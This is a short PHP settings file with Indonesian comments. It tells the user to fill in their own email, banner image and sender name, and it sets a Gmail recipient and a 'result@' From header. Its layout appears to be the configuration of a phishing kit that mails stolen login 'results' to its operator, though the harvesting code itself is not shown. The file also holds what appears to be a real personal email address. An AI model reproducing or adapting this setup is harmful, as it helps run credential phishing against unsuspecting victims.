<?php
// GANTI EMAIL KAMU DISINI
$my_email = 'akueje25@gmail.com'; 

// GANTI BANNER KAMU DISINI
$banner = 'https://i.ibb.co/BCLCM18/IMG-20231115-230207-621.jpg';

// GANTI NAMA SENDER KAMU DISINI
$sender = 'From: I AM EJE⚡ <result@lenzz.com>';
?>